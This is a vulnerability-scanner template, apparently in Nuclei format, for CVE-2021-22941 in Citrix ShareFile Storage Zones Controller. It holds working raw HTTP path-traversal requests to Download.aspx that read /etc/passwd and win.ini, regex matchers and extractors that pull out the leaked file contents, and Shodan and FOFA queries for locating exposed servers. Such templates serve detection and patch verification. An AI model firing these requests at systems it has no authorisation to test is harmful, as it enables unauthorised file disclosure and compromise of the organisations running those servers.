id: CVE-2021-22941

info:
  name: Citrix ShareFile Storage Zones Controller - Broken Access Control
  author: pratikjojode
  severity: critical
  description: |
    Citrix ShareFile Storage Zones Controller before 5.11.20 contains a broken access control vulnerability 
    caused by improper access restrictions. Unauthenticated attackers can remotely compromise the system 
    by exploiting path traversal vulnerabilities in Download.aspx to read arbitrary files from the server.
  reference:
    - https://support.citrix.com/article/CTX328123
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22941
    - https://github.com/hoavt18/CVE-2021-22941
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-22941
    cwe-id: CWE-22
    epss-score: 0.97565
    epss-percentile: 0.99951
    cpe: cpe:2.3:a:citrix:sharefile_storage_zones_controller:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: citrix
    product: sharefile_storage_zones_controller
    shodan-query: http.title:"ShareFile"
    fofa-query: title="ShareFile"
  tags: cve,cve2021,citrix,sharefile,lfi,path-traversal,kev

http:
  - raw:
      - |
        GET /ShareFile/StorageCenter/Download.aspx?fileid=../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET /ShareFile/StorageCenter/Download.aspx?fileid=../../../../../../windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    
    matchers-condition: or
    matchers:
      - type: regex
        name: linux-passwd
        regex:
          - "root:.*:0:0:"
          - "daemon:.*:1:1:"
        condition: or
        part: body

      - type: regex
        name: windows-ini
        regex:
          - '\[fonts\]'
          - '\[extensions\]'
          - '\[files\]'
        condition: or
        part: body

    extractors:
      - type: regex
        name: sensitive-data
        group: 1
        regex:
          - '(root:.*:0:0:.*)'
          - '(\[fonts\].*\[extensions\])'
        part: body
